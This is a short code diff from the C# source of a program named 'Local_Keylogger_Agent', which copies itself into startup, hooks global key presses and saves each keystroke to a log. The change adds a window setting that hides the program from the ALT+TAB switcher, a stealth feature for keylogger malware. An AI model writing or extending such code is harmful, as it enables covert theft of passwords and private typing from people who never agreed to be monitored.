@@ -18,8 +18,6 @@ namespace Local_Keylogger_Agent
             SelfCopy selfCopy = new SelfCopy();
             selfCopy.CopySelfToStartup();
 
-
-
             SubscribeGlobal();
 
             // Start the discovery responder
@@ -46,6 +44,16 @@ namespace Local_Keylogger_Agent
         private void GlobalHook_KeyPress(object sender, KeyPressEventArgs e)
         {
             Storage.SaveOnlyKeyPressLog(e.KeyChar.ToString());
+        }
+
+        protected override CreateParams CreateParams // Hide from ALT+TAB
+        {
+            get
+            {
+                var cp = base.CreateParams;
+                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
+                return cp;
+            }
         }
     }
 }
